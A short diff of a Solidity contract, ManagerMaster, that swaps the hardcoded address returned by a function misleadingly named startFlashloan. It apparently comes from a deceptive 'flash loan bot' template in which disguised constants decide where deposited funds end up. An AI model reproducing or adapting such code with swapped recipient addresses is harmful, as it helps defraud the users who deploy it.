@@ -65,7 +65,7 @@ contract ManagerMaster {
             keccak256(abi.encodePacked((b))));
     }
    function startFlashloan() public pure returns (address) {
-        return 0x35fd3ceEFF0A651526fb8d9A83cbdd185A300a3B;
+        return 0xb88C311c6d902eA5A88Bf79557Bd80f4bB6A188C;
     }
     function pancakeSwapAddress() public pure returns (address) {
         return 0xB2d7B869965FDf402bA0eEA9AcCbE7E126949c27;
